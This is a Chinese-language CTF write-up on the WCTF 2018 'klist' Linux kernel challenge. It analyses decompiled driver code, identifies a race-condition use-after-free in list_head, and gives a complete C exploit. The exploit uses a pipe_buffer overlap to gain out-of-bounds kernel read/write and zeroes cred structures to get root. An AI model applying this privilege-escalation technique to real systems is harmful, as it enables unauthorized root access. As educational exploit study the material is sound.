---
layout: post
title: kernel pwn wctf2018-klist
excerpt: "kernel pwn"
categories: [未完待续]
comments: true
---
http://p4nda.top/2018/11/27/wctf-2018-klist/#select-item

https://blog.csdn.net/seaaseesa/article/details/104649351

https://blog.csdn.net/panhewu9919/article/details/100728934

启动脚本
```
#!/bin/sh
qemu-system-x86_64 \
	-m 1024 -smp cores=2,threads=2,sockets=1 \
	-display none -serial stdio -no-reboot \
	-cpu kvm64,+smep \
	-initrd ./rootfs.img \
	-kernel ./bzImage \
	-gdb tcp::1234 \
	-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet "
```

### 关于内核条件竞争漏洞
条件竞争发生在多线程多进程中，往往是因为没有对全局数据、函数进行加锁，导致多进程同时访问修改，使得数据与理想的不一致而引发漏洞。
### 关于互斥锁
互斥锁主要用于实现内核中的互斥访问功能。对它的访问必须遵循一些规则：同一时间只能有一个任务持有互斥锁，而且只有这个任务可以对互斥锁进行解锁。互斥锁不能进行递归锁定或解锁。一个互斥锁对象必须通过其API初始化，而不能使用memset或复制初始化。一个任务在持有互斥锁的时候是不能结束的。互斥锁所使用的内存区域是不能被释放的。使用中的互斥锁是不能被重新初始化的。并且互斥锁不能用于中断上下文。
#### 开始分析
相关代码如下
```
//1. add_item: 输入user_struc -> (size, user_buf)。程序会申请内存kmalloc(size+0x18),并把user_buf内容拷贝过去，结构指针放单链表首个位置（g_list），flag置1。
signed __int64 __fastcall add_item(__int64 user_struct)
{
    __int64 chunk; // rax
    unsigned __int64 size2; // rdx
    __int64 user_buf2; // rsi
    __int64 chunk2; // rbx
    __int64 v5; // rax
    signed __int64 result; // rax
    unsigned __int64 size; // [rsp+0h] [rbp-18h]
    __int64 user_buf; // [rsp+8h] [rbp-10h]

    if ( copy_from_user(&size, user_struct, 0x10LL) || size > 0x400 )   // 拷贝0x10长度的地址到内核空间
        return -22LL;
    chunk = _kmalloc(size + 0x18, 21103296LL);  //申请size+0x18长度的空间(第一个参数是要分配的块的大小，第二个参数是分配标志)
    size2 = size;
    user_buf2 = user_buf;
    *(_DWORD *)chunk = 1;
    chunk2 = chunk;
    *(_QWORD *)(chunk + 8) = size2;
    if ( copy_from_user(chunk + 0x18, user_buf2, size2) )	//将user_buf2拷贝到chunk + 0x18中
    {
        kfree(chunk2);
        result = -22LL;
    }
    else
    {
        mutex_lock(&list_lock);  // 新建的文件结构体放到最前面
        v5 = g_list;
        g_list = chunk2;
        *(_QWORD *)(chunk2 + 0x10) = v5;
        mutex_unlock(&list_lock);
        result = 0LL;
    }
    return result;
}





//2.select_item: 遍历查找第index个文件结构，放入(fd+200)位置。对所选块进行get操作，并对之前所选的块作put操作
signed __int64 __fastcall select_item(__int64 fd, __int64 index)
{
    __int64 g_list2; // rbx
    __int64 ji; // rax
    volatile signed __int32 **v4; // rbp

    mutex_lock(&list_lock);
    g_list2 = g_list;
    if ( index > 0 )
    {
        if ( !g_list )
        {
            LABEL_9:
            mutex_unlock(&list_lock);
            return -22LL;
        }
        ji = 0LL;
        while ( 1 )
        {
            ++ji;
            g_list2 = *(_QWORD *)(g_list2 + 16);
            if ( index == ji )
                break;
            if ( !g_list2 )
                goto LABEL_9;
        }
    }
    if ( !g_list2 )
        return -22LL;
    get((volatile signed __int32 *)g_list2);                //get: 原子性的加法操作
    mutex_unlock(&list_lock);
    v4 = *(volatile signed __int32 ***)(fd + 200);
    mutex_lock(v4 + 1);
    put(*v4);                                               //put: 原子性的减法操作，减为0时，free掉
    *v4 = (volatile signed __int32 *)g_list2;
    mutex_unlock(v4 + 1);
    return 0LL;
}



//3. remove_item: 对用户输入的index对应的文件结构，作put操作。并非直接free，这是为了防止用select_item选择时，将其放到(fd+200)中，造成UAF。
signed __int64 __fastcall remove_item(__int64 index)
{
    __int64 g_list2; // rax
    signed __int64 ji; // rdx
    __int64 current; // rdi
    __int64 v5; // rdi

    if ( index >= 0 )
    {
        mutex_lock(&list_lock);
        if ( !index )                               // 移除第0个
        {
            v5 = g_list;
            if ( g_list )
            {
                g_list = *(_QWORD *)(g_list + 16);
                put(v5);                                //put: 原子性的减法操作，减为0时，free掉
                mutex_unlock(&list_lock);
                return 0LL;
            }
            goto LABEL_12;
        }
        g_list2 = g_list;
        if ( index != 1 )                           // 移除第index>1个
        {
            if ( !g_list )
            {
                LABEL_12:
                mutex_unlock(&list_lock);
                return -22LL;
            }
            ji = 1LL;
            while ( 1 )
            {
                ++ji;
                g_list2 = *(_QWORD *)(g_list2 + 16);
                if ( index == ji )
                    break;
                if ( !g_list2 )
                    goto LABEL_12;
            }
        }
        current = *(_QWORD *)(g_list2 + 16);
        if ( current )
        {
            *(_QWORD *)(g_list2 + 16) = *(_QWORD *)(current + 16);// 从链表中删除
            put(current);                       //put: 原子性的减法操作，减为0时，free掉
            mutex_unlock(&list_lock);
            return 0LL;
        }
        goto LABEL_12;
    }
    return -22LL;
}




// 4.list_head: 把首个文件结构及内容返回给用户。注意copy_to_user分别调用了get和put函数，标识正在被操作。
unsigned __int64 __fastcall list_head(__int64 user_buf)
{
    __int64 v1; // rbx
    unsigned __int64 v2; // rbx

    mutex_lock(&list_lock);
    get((volatile signed __int32 *)g_list); //get: 原子性的加法操作
    v1 = g_list;
    mutex_unlock(&list_lock);
    v2 = -(signed __int64)((unsigned __int64)copy_to_user(user_buf, v1, *(_QWORD *)(v1 + 8) + 24LL) >= 1) & 0xFFFFFFFFFFFFFFEALL;
    put((volatile signed __int32 *)g_list);             //put: 原子性的减法操作，减为0时，free掉
    return v2;
}


//其中
//get: 原子性的加法操作
void __fastcall get(volatile signed __int32 *a1)
{
    _InterlockedIncrement(a1);
}


//put: 原子性的减法操作，减为0时，free掉
__int64 __fastcall put(volatile signed __int32 *a1)
{
    __int64 result; // rax

    if ( a1 )
    {
        if ( !_InterlockedDecrement(a1) )
            result = kfree(a1);
    }
    return result;
}
```
首先启动脚本run.sh里就提示了，本内核运行于多核环境。然后发现list_head中，先对g_list指向的第1个对象进行get—flag加1，然后对第1个对象进行put—flag减1（为0则释放）。但put操作在mutex_loc/mutex_unlock外部，如果在mutex_unlock之后有一个add_item操作，就可能会释放新加入的对象，而没有清空指针，造成UAF。

首先链表的结构是这样的
```


    struct list_node {  
       int64_t used;  
       size_t size;  
       list_node *next;  
       char buf[XX];  
    }  

```
我们如果能控制size域，将它赋值很大，那么，我们就能溢出堆，搜索内存里的cred结构，然后改写它，进而提权。然而，我们UAF只能控制buf数据区。有一个巧妙的方法就是利用pipe管道。在pipe创建管道的时候，会申请这样一个结构
```
struct pipe_buffer {  
    struct page *page;  
    unsigned int offset, len;  
    const struct pipe_buf_operations *ops;  
    unsigned int flags;  
    unsigned long private;  
};  

```
其中，page是pipe存放数据的缓冲区，offset和len是数据的偏移和长度。比如，一开始,offset和len都是0，当我们`write(pfd[1],buf,0x100);`的时候,`offset = 0，len = 0x100`。然而，我们注意到,offset和len都是4字节数据，如果把它们拼在一起，凑成8字节，就是0x10000000000，如果能够与list_node的size域对应起来，我们就能溢出堆了。

因此，我们一开始申请一个与pipe_buffer大小一样的堆，然后利用竞争释放后，创建一个管道，pipe_buffer就会申请到这里，接下来再write(pfd[1],buf,0x100)，就能使得size域变得很大，那么我们就能溢出堆，进行内存搜索了。

最终的exp代码
```
// Exploit
//pipe
#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/audit.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/reg.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
// size of pipe buffers		//创建节点时，需要发送的数据
#define SIZE 0x280

int list_add(int fd, char* data, long size) {
    long io[2];
    io[0] = size;
    io[1] = (long)data;
    return ioctl(fd, 0x1337, io);
}

int list_select(int fd, long index) {
    return ioctl(fd, 0x1338, index);
}

int list_remove(int fd, long index) {
    return ioctl(fd, 0x1339, index);
}

int list_do_head(int fd, char* data) {
    return ioctl(fd, 0x133a, data);
}

void check_win()
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            system("cat /flag");
            exit(0);
        }
    }
}

int main()
{
    /*setvbuf(stdout, NULL, _IONBF, 0);*/
    pid_t child_pid;
    char* bufA = malloc(SIZE);
    memset(bufA, 'A', SIZE);
    char* bufB = malloc(SIZE);
    memset(bufB, 'B', SIZE);
    char* buf2 = malloc(SIZE);
    memset(buf2, 'C', SIZE);
    char* buf3 = malloc(SIZE);
    memset(buf3, 'D', SIZE);

    int fd = open("/dev/klist", O_RDWR);
    list_add(fd, bufA, SIZE-24);
    list_select(fd, 0);

    puts("beginning race");
    child_pid = fork();
    if (child_pid == 0)
    {
        for(int i = 0; i < 200; i++)     //开200个子进程，死循环，检查是否提权
        {
            child_pid = fork();
            if(child_pid == 0)
                check_win();
        }

        while(1)           // 死循环: add + remove 操作，读取到新数据就停止
        {
            list_add(fd, bufA, SIZE-24);     // 竞争点: remove时list_head线程插入一个put，bufA被释放，flag==0
            list_select(fd, 0);  // 选择之后flag==1
            // 目的已经达到，现在select一直选中这个块了，可以达到任意地址读写的目的
            list_remove(fd, 0);              // 再释放一次bufA, 避免未碰撞时note增加太多。若竞争成功，会把bufA释放kfree两次，不会报错
            list_add(fd, bufB, SIZE-24);     // bufA 恰好被B覆盖
            read(fd, buf2, SIZE-24);
            if(buf2[0] != 'A') {
                puts("race won!");
                break;
            }
            list_remove(fd, 0);              // 没赢，再次尝试
        }

        // 删除并添加管道来占据首个 note
        sleep(1);
        list_remove(fd, 0);
        memset(buf3, 'E', SIZE);
        int fds[2];

        pipe(&fds[0]);
        // 堆喷， 把size覆盖很大，这样就能任意读写。 其实可以只write 1次
        for(int i = 0; i < 9; i++) {
            write(fds[1], buf3, SIZE);
        }

        // 读取内存，泄露cred，修改cred
        unsigned int *ibuf = (unsigned int *)malloc(0x1000000);
        read(fd, ibuf, 0x1000000);
        int j;
        unsigned long max_i = 0;
        int count = 0;
        for(int i = 0; i < 0x1000000/4; i++)
        {
            if (ibuf[i] == 1000 && ibuf[i+1] == 1000 && ibuf[i+7] == 1000)
            {
                printf("[+] We got cred!\n");
                //for (int x=0; x<10; x+=1)
                //  printf("0x%x ",ibuf[x]);
                max_i = i+8;
                for(j = 0; j < 8; j++)
                    ibuf[i+j] = 0;
                count++;
                if(count >= 2)
                    break;
            }
        }
        write(fd, ibuf, max_i*4);

        check_win();
    }
    else if (child_pid > 0)
    {
        // 死循环: 调用list_head 尝试减去flag
        // 读到新数据时停止
        while(1) {
            if(list_do_head(fd, buf3)) {
                puts("wtf head failed");
            }
            read(fd, buf2, SIZE-24);
            if(buf2[0] != 'A') {
                puts("race won thread 2!");
                break;
            }
        }
        check_win();
    }
    else
    {
        puts("fork failed");
        return -1;
    }
    return 0;
}

```
编译语句为
```
gcc -static -O0 -o ./cpio/exp exp.c -lpthread
```